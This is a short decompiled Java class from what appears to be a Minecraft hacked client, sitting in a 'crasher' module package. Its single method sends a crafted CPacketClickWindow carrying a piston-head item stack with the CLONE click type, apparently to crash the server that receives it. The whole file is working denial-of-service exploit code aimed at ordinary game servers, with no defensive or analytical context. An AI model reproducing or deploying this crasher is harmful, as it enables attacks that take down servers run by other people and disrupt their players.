// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.bk;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraft.client.Minecraft;
import net.minecraft.block.Block;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Blocks;

public class BlockKlickCrasher1
{
    public static void start() {
        final ItemStack stack = new ItemStack(Blocks.PISTON_HEAD);
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.CLONE, stack, (short)0));
    }
}
